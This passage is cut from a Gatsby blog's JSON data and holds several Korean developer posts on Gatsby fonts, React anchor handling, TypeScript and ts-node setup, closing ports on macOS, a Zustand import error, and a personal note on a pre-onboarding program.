자료\n\n- [함수형 프로그래밍 유튜브(한국어 자막 지원) - Anjana Vakil](https://www.youtube.com/watch?v=e-5obm1G_FY)\n- [FxTS 공식 홈페이지](https://fxts.dev)\n\n\n```toc\n\n```\n"},{"excerpt":"블로그를 보다가... 뭔가 한글이 좀 이상하게 보이는 느낌이 들었다. 너무 두껍고 가독성이 떨어진달까나? 그래서 폰트를 바꿔보려고 찾아봤다.\n먼저 내가 쓰는 블로그 템플릿은 Gatsby-Starter-Bee이거를 쓰고 있다. 그리고 Node 버전은 이 블로그 구동을 위해 14.15.0으로 설정했다. 1. 폰트를 구해보자 이 블로그 템플릿은 typeface…","fields":{"slug":"/gatsby/230110_change_font/"},"frontmatter":{"date":"January 10, 2023","title":"Gatsby에서 폰트를 바꿔보자 (With Gatsby-Starter-Bee)","description":null,"tags":["Gatsby"],"series":"Gatsby","previewImage":"gatsby_logo.png","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.png)\n\n# 블로그를 보다가...\n\n뭔가 한글이 좀 이상하게 보이는 느낌이 들었다.  \n너무 두껍고 가독성이 떨어진달까나?\n\n그래서 폰트를 바꿔보려고 찾아봤다.\n먼저 내가 쓰는 블로그 템플릿은 **Gatsby-Starter-Bee**이거를 쓰고 있다.  \n그리고 Node 버전은 이 블로그 구동을 위해 **14.15.0**으로 설정했다.\n\n## 1. 폰트를 구해보자\n\n이 블로그 템플릿은 **typeface**를 사용한 거 같은데 이거를 찾아보니 **Deprecated** 되었다.  \n[Github 참고](https://github.com/KyleAMathews/typefaces)\n\n그리고 이것을 대신할 것이 **fontsource**이다.  \n더 자세한 정보는 [FontSource 깃허브](https://github.com/fontsource/fontsource) 와 [공홈](https://fontsource.org) 을 참조하자.\n\n무튼...나는 처음에 네이버의 나눔 고딕 폰트를 추가해봤지만...영 별로였다.  \n그래서 이것저것 찾다가 구글 폰트가 괜찮다 해서 해당 폰트를 찾게 되었다.\n\n일단 적용을 위해 설치를 해준다.\n\n```\nnpm install @fontsource/noto-sans-kr\n```\n\n이렇게 설치를 하고 난 뒤에 몇 가지 설정을 해줘야 한다.\n\n## 2. 폰트 설정해주기\n\n아래의 순서로 하나씩 해준다.\n\n### 2-1 gatsby-browser.js\n\n상단에 커스텀 폰트를 추가한다.\n\n```javascript\n// custom typefaces\nrequire(\"@fontsource/noto-sans-kr\") //추가\nrequire(\"@fontsource/noto-sans-kr/700.css\") //추가\n\n//아래는 기존 것\nrequire(\"typeface-catamaran\")\n\n// polyfill\nrequire(\"intersection-observer\")\n\nconst metaConfig = require(\"./gatsby-meta-config\")\n```\n\n### typography.js\n\n기존에는 **GitHubTheme**를 오버라이딩 해서 쓰는데 밑에 몇가지 설정을 추가해준다.\n\n```javascript\nGitHubTheme.overrideThemeStyles = () => {\n  return {\n    //... 기존 코드\n  }\n}\n\n//신규 코드\nGitHubTheme.baseFontSize = \"20px\" //폰트 크기\nGitHubTheme.baseLineHeight = 1.666 //가로 사이즈?\nGitHubTheme.scaleRatio = 2.0\nGitHubTheme.headerWeight = 700\nGitHubTheme.headerFontFamily = [\"Noto Sans KR\"]\nGitHubTheme.bodyWeight = 100 //이게 너무 높으면 볼드체 된다.\nGitHubTheme.boldWeight = 700\nGitHubTheme.bodyFontFamily = [\"Noto Sans KR\"]\n\n//아래는 기존 코드\nconst typography = new Typography(GitHubTheme)\n```\n\n여기는 입맛에 맞게 설정하면 되는데 위는 샘플이다.\n\n이렇게 설정하면 글 폰트 보는게 한결 나아진다.  \n기분탓일 수도 있는데 난 가독성이 좀 올라간거 같아서 마음에 든다.\n\n<br>\n\n## 참고\n\n- [typography 예제](http://kyleamathews.github.io/typography.js/)\n- [Gatsby 공식 문서 - Style font](https://www.gatsbyjs.com/docs/how-to/styling/using-web-fonts/)\n- [참고 블로그](https://soopdop.github.io/2020/11/25/change-font-in-gatsby/)\n\n```toc\n\n```\n"},{"excerpt":"React 개발을 하다가... 이번에 사전 과제를 하다가 a 태그를 쓰는데 이 태그는 알다시피 href 때문에 페이지 이동이 일어난다. 그래서 그냥 클릭했을 때 이벤트만 받길 원했는데 방법을 찾아봤다. 찾아보기 보다는 그냥 떠오른 생각? 1. 그냥 div 등에 onClick 이벤트 처리 위 코드 처럼도 처리할 수 있지만 마우스 커서가 갔을 때 클릭 가능함…","fields":{"slug":"/react/230109_atag_link_stop/"},"frontmatter":{"date":"January 09, 2023","title":"React에서 a태그 링크 막는 방법","description":null,"tags":["ReactJS"],"series":"ReactJS","previewImage":"react_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_react.png)\n\n# React 개발을 하다가...\n\n이번에 사전 과제를 하다가 a 태그를 쓰는데 이 태그는 알다시피 **href** 때문에 페이지 이동이 일어난다.  \n그래서 그냥 클릭했을 때 이벤트만 받길 원했는데 방법을 찾아봤다.\n\n찾아보기 보다는 그냥 떠오른 생각?\n\n## 1. 그냥 div 등에 onClick 이벤트 처리\n\n```tsx\n<div onClick={someFunc}></div>\n```\n\n위 코드 처럼도 처리할 수 있지만 마우스 커서가 갔을 때 클릭 가능함을 표시하고 싶었다.  \n물론 깊게 들어가면 또 할 수 있지만 간단히 처리하는 법이 필요했다.\n\n## 2. a태그에 처리하기\n\n```tsx\n<a href=\"#\" onClick={e => e.preventDefault}>\n  {item.title}\n</a>\n```\n\n위와 같이 작성하면 내가 원하는 방식으로 동작한다.  \n단 href에 구석기 시대에 쓰던 방식으로 쓰면 리엑트에서 쓰지 말라 한다.\n\n> href=\"javascript:void(0)\"\n\n```toc\n\n```\n"},{"excerpt":"Typescript Playground가 필요하다 Typescript로 개발을 하다가 뭔가 특정 기능(프로젝트와 무관한)을 테스트 해보고 싶은데, 이걸 매번 진행하는 프로젝트 내에서 테스트하기가 좀 불편했다. 물론 타입스크립트 온라인 플레이그라운드가 있긴 했지만 내 로컬에서 도는 것이 필요했다. 그래서 하나 만들면서 미래의 내가 또 잊을까봐 기록을 남겨둔…","fields":{"slug":"/js_ts/230109_init_typescript_project/"},"frontmatter":{"date":"January 09, 2023","title":"(Typescript) Typescript 프로젝트 만들기 (With VSCode)","description":null,"tags":["Typescript","VSCode"],"series":"JS_TS","previewImage":"typescript_logo.png","isPrivate":null},"rawMarkdownBody":"\n# Typescript Playground가 필요하다\n\nTypescript로 개발을 하다가 뭔가 특정 기능(프로젝트와 무관한)을 테스트 해보고 싶은데,  \n이걸 매번 진행하는 프로젝트 내에서 테스트하기가 좀 불편했다.  \n물론 [타입스크립트 온라인 플레이그라운드](https://www.typescriptlang.org/play)가 있긴 했지만 내 로컬에서 도는 것이 필요했다.\n\n그래서 하나 만들면서 미래의 내가 또 잊을까봐 기록을 남겨둔다.\n\n참고로 특이 사항 및 환경은 아래와 같다.\n\n- Mac OS, VSCode 사용\n- npm이나 yarn 설치 가정\n- typescript를 전역 설치가 아닌 프로젝트 내에서만 사용하게끔 처리\n\n## 1. 폴더 생성 및 초기화\n\n먼저 디렉토리를 적당한 곳에 하나 만들어주고, 다음과 같이 명령어를 통해 초기화 해준다.\n\n```\n# 프로젝트에 package.json을 만들어둔다.\nyarn init\n```\n\n<br>\n\n그리고 typescript를 설치해준다.\n\n```\n# 타입스크립스를 개발 의존성으로 설치\nyarn add typescript --dev\n```\n\n![](/img01.png)\n\n<br>\n\n```\n# Typescript 초기화 (설정파일 생성)\n./node_modules/typescript/bin/tsc --init\n```\n\n![](/img02.png)\n\n<br>\n\n여기까지 하면 프로젝트 내에 **tsconfig.json** 파일이 생성되었을 것이다.\n\n이 파일은 **typescript**의 전반적인 설정을 다루는 파일인데 파일을 열면 아래와 같이 기본 설정 값 및 설명이 써 있다.\n\n<br>\n\n```json\n{\n  \"compilerOptions\": {\n    /* Visit https://aka.ms/tsconfig to read more about this file */\n\n    /* Projects */\n    // \"incremental\": true,                              /* Save .tsbuildinfo files to allow for incremental compilation of projects. */\n    // \"composite\": true,                                /* Enable constraints that allow a TypeScript project to be used with project references. */\n    // \"tsBuildInfoFile\": \"./.tsbuildinfo\",              /* Specify the path to .tsbuildinfo incremental compilation file. */\n    // \"disableSourceOfProjectReferenceRedirect\": true,  /* Disable preferring source files instead of declaration files when referencing composite projects. */\n    // \"disableSolutionSearching\": true,                 /* Opt a project out of multi-project reference checking when editing. */\n    // \"disableReferencedProjectLoad\": true,             /* Reduce the number of projects loaded automatically by TypeScript. */\n\n    /* Language and Environment */\n    \"target\": \"es2016\" /* Set the JavaScript language version for emitted JavaScript and include compatible library declarations. */,\n    // \"lib\": [],                                        /* Specify a set of bundled library declaration files that describe the target runtime environment. */\n    // \"jsx\": \"preserve\",                                /* Specify what JSX code is generated. */\n    // \"experimentalDecorators\": true,                   /* Enable experimental support for TC39 stage 2 draft decorators. */\n    // \"emitDecoratorMetadata\": true,                    /* Emit design-type metadata for decorated declarations in source files. */\n    // \"jsxFactory\": \"\",                                 /* Specify the JSX factory function used when targeting React JSX emit, e.g. 'React.createElement' or 'h'. */\n    // \"jsxFragmentFactory\": \"\",                         /* Specify the JSX Fragment reference used for fragments when targeting React JSX emit e.g. 'React.Fragment' or 'Fragment'. */\n    // \"jsxImportSource\": \"\",                            /* Specify module specifier used to import the JSX factory functions when using 'jsx: react-jsx*'. */\n    // \"reactNamespace\": \"\",                             /* Specify the object invoked for 'createElement'. This only applies when targeting 'react' JSX emit. */\n    // \"noLib\": true,                                    /* Disable including any library files, including the default lib.d.ts. */\n    // \"useDefineForClassFields\": true,                  /* Emit ECMAScript-standard-compliant class fields. */\n    // \"moduleDetection\": \"auto\",                        /* Control what method is used to detect module-format JS files. */\n\n    /* Modules */\n    \"module\": \"commonjs\" /* Specify what module code is generated. */,\n    // \"rootDir\": \"./\",                                  /* Specify the root folder within your source files. */\n    // \"moduleResolution\": \"node\",                       /* Specify how TypeScript looks up a file from a given module specifier. */\n    // \"baseUrl\": \"./\",                                  /* Specify the base directory to resolve non-relative module names. */\n    // \"paths\": {},                                      /* Specify a set of entries that re-map imports to additional lookup locations. */\n    // \"rootDirs\": [],                                   /* Allow multiple folders to be treated as one when resolving modules. */\n    // \"typeRoots\": [],                                  /* Specify multiple folders that act like './node_modules/@types'. */\n    // \"types\": [],                                      /* Specify type package names to be included without being referenced in a source file. */\n    // \"allowUmdGlobalAccess\": true,                     /* Allow accessing UMD globals from modules. */\n    // \"moduleSuffixes\": [],                             /* List of file name suffixes to search when resolving a module. */\n    // \"resolveJsonModule\": true,                        /* Enable importing .json files. */\n    // \"noResolve\": true,                                /* Disallow 'import's, 'require's or '<reference>'s from expanding the number of files TypeScript should add to a project. */\n\n    /* JavaScript Support */\n    // \"allowJs\": true,                                  /* Allow JavaScript files to be a part of your program. Use the 'checkJS' option to get errors from these files. */\n    // \"checkJs\": true,                                  /* Enable error reporting in type-checked JavaScript files. */\n    // \"maxNodeModuleJsDepth\": 1,                        /* Specify the maximum folder depth used for checking JavaScript files from 'node_modules'. Only applicable with 'allowJs'. */\n\n    /* Emit */\n    // \"declaration\": true,                              /* Generate .d.ts files from TypeScript and JavaScript files in your project. */\n    // \"declarationMap\": true,                           /* Create sourcemaps for d.ts files. */\n    // \"emitDeclarationOnly\": true,                      /* Only output d.ts files and not JavaScript files. */\n    // \"sourceMap\": true,                                /* Create source map files for emitted JavaScript files. */\n    // \"outFile\": \"./\",                                  /* Specify a file that bundles all outputs into one JavaScript file. If 'declaration' is true, also designates a file that bundles all .d.ts output. */\n    // \"outDir\": \"./\",                                   /* Specify an output folder for all emitted files. */\n    // \"removeComments\": true,                           /* Disable emitting comments. */\n    // \"noEmit\": true,                                   /* Disable emitting files from a compilation. */\n    // \"importHelpers\": true,                            /* Allow importing helper functions from tslib once per project, instead of including them per-file. */\n    // \"importsNotUsedAsValues\": \"remove\",               /* Specify emit/checking behavior for imports that are only used for types. */\n    // \"downlevelIteration\": true,                       /* Emit more compliant, but verbose and less performant JavaScript for iteration. */\n    // \"sourceRoot\": \"\",                                 /* Specify the root path for debuggers to find the reference source code. */\n    // \"mapRoot\": \"\",                                    /* Specify the location where debugger should locate map files instead of generated locations. */\n    // \"inlineSourceMap\": true,                          /* Include sourcemap files inside the emitted JavaScript. */\n    // \"inlineSources\": true,                            /* Include source code in the sourcemaps inside the emitted JavaScript. */\n    // \"emitBOM\": true,                                  /* Emit a UTF-8 Byte Order Mark (BOM) in the beginning of output files. */\n    // \"newLine\": \"crlf\",                                /* Set the newline character for emitting files. */\n    // \"stripInternal\": true,                            /* Disable emitting declarations that have '@internal' in their JSDoc comments. */\n    // \"noEmitHelpers\": true,                            /* Disable generating custom helper functions like '__extends' in compiled output. */\n    // \"noEmitOnError\": true,                            /* Disable emitting files if any type checking errors are reported. */\n    // \"preserveConstEnums\": true,                       /* Disable erasing 'const enum' declarations in generated code. */\n    // \"declarationDir\": \"./\",                           /* Specify the output directory for generated declaration files. */\n    // \"preserveValueImports\": true,                     /* Preserve unused imported values in the JavaScript output that would otherwise be removed. */\n\n    /* Interop Constraints */\n    // \"isolatedModules\": true,                          /* Ensure that each file can be safely transpiled without relying on other imports. */\n    // \"allowSyntheticDefaultImports\": true,             /* Allow 'import x from y' when a module doesn't have a default export. */\n    \"esModuleInterop\": true /* Emit additional JavaScript to ease support for importing CommonJS modules. This enables 'allowSyntheticDefaultImports' for type compatibility. */,\n    // \"preserveSymlinks\": true,                         /* Disable resolving symlinks to their realpath. This correlates to the same flag in node. */\n    \"forceConsistentCasingInFileNames\": true /* Ensure that casing is correct in imports. */,\n\n    /* Type Checking */\n    \"strict\": true /* Enable all strict type-checking options. */,\n    // \"noImplicitAny\": true,                            /* Enable error reporting for expressions and declarations with an implied 'any' type. */\n    // \"strictNullChecks\": true,                         /* When type checking, take into account 'null' and 'undefined'. */\n    // \"strictFunctionTypes\": true,                      /* When assigning functions, check to ensure parameters and the return values are subtype-compatible. */\n    // \"strictBindCallApply\": true,                      /* Check that the arguments for 'bind', 'call', and 'apply' methods match the original function. */\n    // \"strictPropertyInitialization\": true,             /* Check for class properties that are declared but not set in the constructor. */\n    // \"noImplicitThis\": true,                           /* Enable error reporting when 'this' is given the type 'any'. */\n    // \"useUnknownInCatchVariables\": true,               /* Default catch clause variables as 'unknown' instead of 'any'. */\n    // \"alwaysStrict\": true,                             /* Ensure 'use strict' is always emitted. */\n    // \"noUnusedLocals\": true,                           /* Enable error reporting when local variables aren't read. */\n    // \"noUnusedParameters\": true,                       /* Raise an error when a function parameter isn't read. */\n    // \"exactOptionalPropertyTypes\": true,               /* Interpret optional property types as written, rather than adding 'undefined'. */\n    // \"noImplicitReturns\": true,                        /* Enable error reporting for codepaths that do not explicitly return in a function. */\n    // \"noFallthroughCasesInSwitch\": true,               /* Enable error reporting for fallthrough cases in switch statements. */\n    // \"noUncheckedIndexedAccess\": true,                 /* Add 'undefined' to a type when accessed using an index. */\n    // \"noImplicitOverride\": true,                       /* Ensure overriding members in derived classes are marked with an override modifier. */\n    // \"noPropertyAccessFromIndexSignature\": true,       /* Enforces using indexed accessors for keys declared using an indexed type. */\n    // \"allowUnusedLabels\": true,                        /* Disable error reporting for unused labels. */\n    // \"allowUnreachableCode\": true,                     /* Disable error reporting for unreachable code. */\n\n    /* Completeness */\n    // \"skipDefaultLibCheck\": true,                      /* Skip type checking .d.ts files that are included with TypeScript. */\n    \"skipLibCheck\": true /* Skip type checking all .d.ts files. */\n  }\n}\n```\n\n일단 복잡하니 아래와 같이 설정을 정리해줬다.\n\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"es2016\",\n    \"module\": \"commonjs\",\n    \"outDir\": \"./out\", // 트랜스파일 되어 js가 떨어질 곳\n    \"strict\": true,\n    \"rootDirs\": [\"src\"], // typescript 파일 위치\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true\n  }\n}\n```\n\n그리고 src 디렉토리 밑에 index.ts 파일을 하나 만들어서 대충 아무 코드나 입력해준다.\n\n```typescript\n//./src/index.ts\n\nconsole.log(\"hello Test\")\n```\n\n그리고 콘솔에 다음과 같이 쳐서 잘 트랜스파일이 되는지 확인해본다.\n\n```\n./node_modules/typescript/bin/tsc\n```\n\n그럼 아래와 같이 out에 js파일 하나가 떨어짐을 확인할 수 있다.\n\n![](/img03.png)\n\n이걸 이렇게 하면 우리는 실행 결과를 직접 html에 넣어 브라우저에서 확인하는 방법이면 여기서 끝이고...  \n난 node를 이용해서 콘솔 등에서 확인하고 싶다면 아래 ts-node를 활용하는 법을 알아보자.\n\n<br>\n\n## 2. ts-node를 활용하여 콘솔에서 확인하기\n\n먼저 ts-node란 typescript를 노드에서 실행할 수 있게 해주는 node라 생각하면 편하다.  \nnode는 알다시피 js 파일만 이해할 수 있는데 이를 ts도 실행할 수 있게 해주는 거라 생각하면 된다.  \n무튼 설치를 해준다.\n\n```\nyarn add ts-node --dev\n```\n\n설치 후 아래와 같이 명령어를 수행하면 콘솔에 실행이 된다.\n\n```\n./node_modules/ts-node/dist/bin.js src/index.ts\n```\n\n아래 사진을 참고하자.\n\n![](/img04.png)\n\n<br>\n\n## 3. 명령어를 한번에...\n\n이렇게 하면 상당히 복잡하다는 것을 알 수 있다.  \n그나마 package.json의 script를 해둠으로 약간 편의성을 도모할 수 있다.\n\n```json\n{\n  \"name\": \"playground\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\",\n  \"license\": \"MIT\",\n  \"dependencies\": {},\n  \"devDependencies\": {\n    \"ts-node\": \"^10.9.1\",\n    \"typescript\": \"^4.9.4\"\n  },\n  \"scripts\": {\n    \"ts_trans\": \"./node_modules/typescript/bin/tsc\",\n    \"ts_run\": \"./node_modules/ts-node/dist/bin.js src/index.ts\"\n  }\n}\n```\n\n그리고 아래와 같이 실행하면 편하게 할 수 있다.\n\n![](/img05.png)\n\n<br>\n\n### 기타...\n\n그냥 큰 특이사항 아니면 플레이그라운드를 활용하는 것도 좋은 방법...\n\n```toc\n\n```\n"},{"excerpt":"VSCode에서 작업을 하다가 갑자기 VSCode가 강제종료가 된 후 다시 켜지는 일이 있었다. 그 때 VSCode에서는 몇 개의 개발 서버를 터미널에서 구동하고 있던 중인데, 포트가 안닫혔는지 계속 사용하고 있는 포트라는 메세지가 떠서 이를 해결한 부분의 기록을 남긴다. 1. 열린 포트 확인 먼저 해당 포트가 열려있는지 확인이 필요하고 그 포트를 담당하…","fields":{"slug":"/mac/230109_close_port/230109_close_port/"},"frontmatter":{"date":"January 09, 2023","title":"Mac에서 현재 열려있는 포트 확인 및 닫기","description":null,"tags":["Mac"],"series":"Mac","previewImage":"how.png","isPrivate":null},"rawMarkdownBody":"\n# VSCode에서 작업을 하다가\n\n갑자기 VSCode가 강제종료가 된 후 다시 켜지는 일이 있었다.  \n그 때 VSCode에서는 몇 개의 개발 서버를 터미널에서 구동하고 있던 중인데,  \n포트가 안닫혔는지 계속 사용하고 있는 포트라는 메세지가 떠서 이를 해결한 부분의 기록을 남긴다.\n\n## 1. 열린 포트 확인\n\n먼저 해당 포트가 열려있는지 확인이 필요하고 그 포트를 담당하는 PID를 알아야 한다.\n\n```\n# 전체 열린 포트 찾는 명령어\nsudo lsof -PiTCP -sTCP:LISTEN\n\n# 특정 포트 찾기 (3000)\nsudo lsof -i :3000\n```\n\n위 명령어를 통해 열린 포트를 찾는다.\n\n## 2. 포트 닫기\n\n아래의 명령어를 통해 PID를 죽인 뒤 확인하면 잘 된다.\n\n```\n# PID에는 위에서 알아낸 PID를 적는다.\nsudo kill -9 PID\n```\n\n```toc\n\n```\n"},{"excerpt":"새해에는 자연스럽게 바쁜 삶을... 작년 말(작년이라 하니 어감이 안감기네) 부터 이것저것 벌여놓은 것을 하나씩 정리하던 도중... 코드스테이츠 & 위메이드 블록체인 아카데미에 당첨되어 진행을 시작했고, 현재 진행 중이다. 맨 처음엔 Go언어 하다가 지금은 블록체인 영역을 하는데...\n진짜 이론만 너무 많고 할 수록 나랑 핏이나 스타일이 맞지 않는 느낌이…","fields":{"slug":"/my_story/230108_talk/"},"frontmatter":{"date":"January 08, 2023","title":"230108 이야기 - 원티드 프리온보딩 (백엔드/프론트) 진행","description":null,"tags":["My Story"],"series":"My Story","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 새해에는 자연스럽게 바쁜 삶을...\n\n작년 말(작년이라 하니 어감이 안감기네) 부터 이것저것 벌여놓은 것을 하나씩 정리하던 도중...  \n코드스테이츠 & 위메이드 블록체인 아카데미에 당첨되어 진행을 시작했고, 현재 진행 중이다.\n\n맨 처음엔 Go언어 하다가 지금은 블록체인 영역을 하는데...\n진짜 이론만 너무 많고 할 수록 나랑 핏이나 스타일이 맞지 않는 느낌이 들었다.\n\n블록체인 모를 때는 재미있을 것 같고 했는데, 교육으로 오니 정말 답답하고 이걸 다 알아야 해? 라는 생각도 많이 들었다.  \n그렇다고 포기하는건 좀 그렇고 해서 일단 진행은 하고 있다.\n\n이거는 나중에 후기글로 다시 찾을 예정이고...  \n그리고 블록체인은 한번 배워두면 좋을 거 같아서\n시간이 날 때마다 조금씩 학습은 이어나갈 예정이다.\n\n무튼 진행을 하다가 원티드에서 프리온보딩를 한다고 하여 봤다.\n\n백엔드 프론트엔드 두 영역 다 하는 나로써 좀 더 깊게 알아가기 위해 둘 다 신청했다.(?)  \n근데 시간이 겹치는거 같은데...일단 강의는 zoom으로 하는데 둘다 틀어두고 각각 들어보면 되지 않을까 싶어 일단 신청했다.\n\n## 백엔드\n\n![](/img02.png)\n\n백엔드의 경우 사전 과제가 뭔가 구현이라기 보다는 기본지식? 간단한 설문조사 느낌이었다.\n\n```\n1. 본인이 작성했던 코드 중 공유하고 싶은 코드를 이유와 함께 마크다운 code block 을 사용해 올려주세요\n2. Layered Architecture(계층 아키텍처)에 대해서 설명해 주세요\n3. Dependency Injection(의존성 주입)의 개념과 함께, 왜 필요한지 작성해 주세요\n4. 본인이 사용하는 언어의 Functional Programming(함수형 프로그래밍) 스펙을 예제와 함께 소개해 주세요\n5. (코드 작성) 다음 스펙을 만족하는 delay 함수를 작성해 주세요 (hint: Promise 사용)\n6. 강의를 통해서 기대하는 바, 또는 얻고 싶은 팁을 적어주세요\n```\n\n이 정도였고 깃허브 이슈에 등록 후 제출하는 것이었다.\n\n## 프론트엔드\n\n![](/img01.png)\n\n프론트의 경우 실무형 과제가 있었다.  \n과제가 궁금하신 분은 [사전과제 설명](https://github.com/starkoora/wanted-pre-onboarding-challenge-fe-1-api#updateTodo) 참고하시면 되겠다.\n\n과제 난이도가 낮은 편인데 나는 이거 지원한게 마감 몇일 전이었다.  \n근데 선택적이라 해서 안할까 했는데 그냥 한번 해보자 라는 마인드로 진행했다.\n\n내가 만든 프로젝트는 [여기](https://github.com/elfinlas/wanted-pre-onboarding-challenge-fe-1)에 올렸다.  \n사실 막 짠거 + 기능 구현 위주라 미흡한 부분이 많다.\n\n그래서 **ReadMe**에도 기재했다.\n\n## 지원해보면서...\n\n요새는 다시 다른 사람들과 일해보고 싶다.\n\n근데 너무 하드한 회사는 다니고 싶지 않다.  \n그냥 워라벨 좋은 회사?  \n돈은 적당히 주고 정해진 시간 만큼 내가 일 열심히 할 수 있는 회사를 다녀보고 싶다.\n\n개인적으로 네카라쿠베 같은데 다니면 좋겠지.  \n근데 연봉 8천이니 1억이니 해도 꽁으론 안주고 그거 다 시간 뽑아 먹어서 주는거다.\n\n결국 거기에서 자기 몸값 열심히 올려도 글쎄...  \n그리 다니면 몸만 망가지고, 다른 것도 못하니까 개발이라는 영역 안에만 갇혀서 살게 된다랄까?\n\n아주 옛날에 돈 없을 때는 나도 네이버 가고 싶고 돈 많이 주는데 가고 싶었는데 ㅋ  \n지금은 그냥 일은 일대로 하고 나머지 시간은 나를 위해 쓰고 싶다.\n\n전에 이상한 스타트업 다닐때는 왜 밤샘하고 그리 했는지...  \n내가 거기 회사 주인도 아니고 열심히 일해도 보상이 없는데 참 ㅎㅎ\n\n지금도 그렇겠지만 옛날에도 이상한 스타트업이나 이상한 대표 등 이상한 사람이 많다.  \n근데 그 이상한 사람은 본인이 이상한지 모르는게 함정일 뿐...\n\n그리고 주관적인 생각이지만...  \n노동 가치를 무시하는 건 절대 아니지만, 노동으로 버는 돈 보다는 투자와 함께 이뤄지는게 더 안정적이랄까?  \n뭐 지금과 같이 투자 빙하기에는 공감하기 어렵겠지만...  \n개인적인 생각이다.\n\n이럴 때 일수록 다른 공부도 해야 하며,  \n자기 투자를 많이 해야 더 많은 기회를 볼 수 있는 것 같다.  \n그게 이런 개발 분야일 수도 있지만, 다른 도메인(경제, 미술, 투자, 부동산 등)도 배워둬야 좋은 것 같다.\n\n무튼 이번에 프리온보딩 해보면서 많이 배우고 기회가 되면 다른 사람들과 함께 다시 일해보고 싶다.  \n후우 이력서도 다시 쓰려니 귀찮네...\n\n<br>\n\n> 여담인데 요새 금리 올라서...  \n> 계산해보니 아직 버틸만 한데...그래도 미리 준비를 해둬야 24년 말 이후를 버틸 수 있지 않을까 싶다.  \n> 투자한게 영끌은 아니지만 그래도 앞자리 7로 바뀌니 좀 어질어질하다.  \n> 항상 느끼는 거지만 부동산이랑 주식은 바닥에 사는건 정말 어려운 것 같다.  \n> 그냥 무릎 쯔음 사서 어깨에 파는게 제일 베스트인데...과연? 😏  \n> 24년까지는 어두운 시즌이 갈거 같은데...그때까지 모든 투자자분들 화이팅!\n\n```toc\n\n```\n"},{"excerpt":"오랜만에 NextJs를 처음 셋업하다가... 최근 코드스테이츠&위메이드 블록체인 교육 과정을 듣는데... 일단 블록체인이 내가 생각한 거랑 너무 달랐고, 복잡했다. 결과를 바로 보기 힘들고 작은 시간 투자로는 제대로 해볼 수 없는 분야였다. (당연한 것...) 그러던 중 원티드에서 프리온보딩을 한다고 해서 바로 수강 신청 하였다. 근데 프론트도 있고 백엔…","fields":{"slug":"/next-js/230107_zustand_module_not_found/"},"frontmatter":{"date":"January 07, 2023","title":"NextJs에서 Zustand 사용시 Module not found 문제","description":null,"tags":["NextJs","Zustand","Troubleshooting"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n# 오랜만에 NextJs를 처음 셋업하다가...\n\n최근 코드스테이츠&위메이드 블록체인 교육 과정을 듣는데...  \n일단 블록체인이 내가 생각한 거랑 너무 달랐고, 복잡했다.\n\n결과를 바로 보기 힘들고 작은 시간 투자로는 제대로 해볼 수 없는 분야였다. (당연한 것...)  \n그러던 중 원티드에서 프리온보딩을 한다고 해서 바로 수강 신청 하였다.\n\n<br>\n\n근데 프론트도 있고 백엔드도 있어서 일단 둘 다 신청했다... (-\\_-;;)  \n사실 지금도 **Next.Js**랑 **Nest.Js** 둘다 쓰고 있어서...  \n둘다 깊게 잘 하는건 아니지만 서비스를 구현하고 실제 운영중이기도 하다.\n\n[MyMeLink](https://myme.link) 이게 1차 결과물이다.  \n보완점이 엄청 많은데 지금은 일단 손놓고 있다;;  \n신규 서비스 개발이 하나 있었다가 블록체인 강의도 껴서...\n\n<br>\n\n각설하고 이유는 프리온보딩 프론트에서 사전 과제가 있었는데 그걸 위해서 플젝을 셋업하고...  \n상태관리에서 [Zustand](https://github.com/pmndrs/zustand)를 사용하고 적용을 하다가 문제가 발생했다.\n\n그전에...\n**Next.Js**는 **12.3.1** 이고, **Zustand**는 **4.2.0**임을 참고하자\n\n<br>\n\n![](/img01.png)\n\n<br>\n\n계속 Module을 못찾는다고 했다.  \n**tsconfig.json**및 기타 모든 설정 파일과 더불어 재설치도 했지만 찾을 수 없었다.\n\n그러다 구글링 도중 [StackOverflow](https://stackoverflow.com/questions/73682992/missing-react-export-in-zustand-package/73816289)에서 원인을 찾았다.\n\n```typescript\nimport create from \"zustand\"\n```\n\n내 기존 코드는 아래와 같이 호출하고 있었다.\n\n```typescript\nimport create from \"zustand/react\"\n```\n\n혹시나 해서 전에 개발했던 코드를 봤더니...  \n역시 import나 추가 구문도 항상 잘 확인해야 한다는걸 깨달았다...\n"},{"excerpt":"너무 오랜만에 쓰는 포스팅 너무 오랜만에 포스팅이다... 2022년에는 너무 많은 일이 있었다. 갤러리 구경, 고프로 사서 이것저것 찍기, 취미 사진 촬영, 와인, 취미 개발 등등.. 게다가 연말엔 위메이드 & 코드스테이츠 주관 블록체인 개발자 인가 그거까지 진행하게 되어서 바쁘게 흘렀다. 이렇게 보내다 보니 개발 블로그를 손을 놓게 되었다. 남들처럼 정…","fields":{"slug":"/react/221230_clipboard/"},"frontmatter":{"date":"December 30, 2022","title":"React에서 클립보드로 텍스트 복사하기","description":null,"tags":["ReactJS"],"series":"ReactJS","previewImage":"react_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_react.png)\n\n# 너무 오랜만에 쓰는 포스팅\n\n너무 오랜만에 포스팅이다...  \n2022년에는 너무 많은 일이 있었다.  \n갤러리 구경, 고프로 사서 이것저것 찍기, 취미 사진 촬영, 와인, 취미 개발 등등..  \n게다가 연말엔 위메이드 & 코드스테이츠 주관 블록체인 개발자 인가 그거까지 진행하게 되어서 바쁘게 흘렀다.\n\n이렇게 보내다 보니 개발 블로그를 손을 놓게 되었다.  \n남들처럼 정상적인 삶(?)이 아니다 보니... 온라인에 시간을 할애하기가 어려웠다.  \n그래도 새해가 되어 다시 마음을 잡고자 한번 시간을 내어 포스팅을 해보자 라는 생각으로 글을 남기게 되었다.  \n각설하고...\n\n## 클립보드를 React에서 활용하는 법\n\n클립보드를 사용하는 법은 두 가지가 있다.\n\n1. [Clipboard-Api](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/clipboard)\n2. [Document.queryCommandSupported](https://developer.mozilla.org/en-US/docs/Web/API/Document/queryCommandSupported)\n\n그런데 2번 방법은 이제 **Deprecated** 